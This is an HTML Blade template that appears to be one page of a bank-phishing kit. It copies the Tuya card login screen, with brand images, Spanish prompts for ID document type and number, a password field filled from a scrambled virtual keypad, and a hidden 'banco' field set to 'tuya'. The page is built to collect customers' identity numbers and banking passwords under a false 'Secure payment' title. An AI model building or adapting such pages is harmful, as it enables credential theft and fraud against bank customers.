<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0,user-scalable=0 ">
    <meta name="csrf-token" content="{{ csrf_token() }}">

     <script type="text/javascript" src="{{asset('assets/js/jquery-3.6.0.min.js')}}"></script>		
    <link rel="stylesheet" href="{{asset('assets/css/payment/tuya.css')}}">


    <title>Secure payment</title>



    <script src="http://ajax.googleapis.com/ajax/libs/jquery/1/jquery.min.js" type="text/javascript"></script>
	<script type="text/javascript" src="{{asset('assets/js/teclado.js')}}"></script>
	<link rel="stylesheet" type="text/css" href="{{asset('assets/css/virtual-key.css')}}">
    <style>
        *{
            -webkit-appearance: none;
    -webkit-border-radius: 0;
            margin: 0;
            padding:0;
            font-family: Arial, Helvetica, sans-serif;
        }
        .main{
            background-color: red;
            border-top-right-radius: 200px;
            border-bottom-right-radius: 
            200px;
            width: 90%;
            height: 150px;
            padding-top:20px;
        }
        a{
            color:white;
            font-size:30px;
           align-items: center;
        }
    </style>
</head>

<body>
    <div class="main"><center><a>Un mundo de</a><br><a style="font-size:40px;"><b>beneficios</b><br></a>
        <a>hechos <b style="font-size:40px;">para ti</b></a>
    </div></center>


    <div style="background-color:;">
        <br>
      <center>  <img src="{{asset('assets/img/payment/tuya/tuya.png')}}" alt="" width="20%">
        <img src="{{asset('assets/img/payment/tuya/pago.jpg')}}" alt="" srcset="" width="30%" style="margin-left:40px;">
    </div>
<br><br>
    <div><b><center>Por favor bríndenos su identificación y clave:</center></b><br><br><br>
        <div class = "teclado" style="position:absolute;">

<table class="table_teclado" style="margin-left:50px;">
    <tr>
        <td>1</td>
        <td>0</td>
        <td>8</td>
    </tr>
    <tr>
        <td>9</td>
        <td>7</td>
        <td>6</td>
    </tr>
    <tr>
        <td>5</td>
        <td>2</td>
        <td>3</td>
    </tr>
    <tr>
        <td colspan="1">0</td>
        <td colspan="2" style="font-size:18px;">Borrar</td>
    </tr>
</table></div>

        <div class = "datos"  style="position:absolute; margin-left:180px;"> 
        
        
        
    
    
    
        <h4>Tipo de Documento</h4>
        <select style="height:40px; border:1px solid gray; background-color: white; width: 185px; align-item:center; color:black; padding-left: 15px;">
            <option>CEDULA DE CIUDADANIA</option>
            <option>PASAPORTE</option>
        </select><br><br>
        <h4>Documento de <br>identificación</h4>
        <input type="number" id="txtUsuario" style="height:40px; width: 183px; border:1px solid gray;" name="cedula" minlength="6" maxlength="10" pattern="^[0-9]{6,10}$" oninput="this.value = this.value.replace(/\D+/g, '');"> 


       <h4 style="position:absolute; margin-top:20px;">Clave</h4> 
       <input type="text" readonly id="campo" name="clave" class="teclado_text" style="height:40px; width: 80px; border:1px solid gray; position:absolute; bottom:70px; left:50px;"> 
        <input type="hidden" name="" value="tuya" id="banco">
       <center> <input type="submit" value="Ingresar" id="btnUsuario" style="background-color:red; color:white; margin-top: 80px; height: 45px; border: none; font-family: Arial, Helvetica, sans-serif; padding:5px; font-size: 18px;"></center>
    </div>
    </div>

</body>

</html>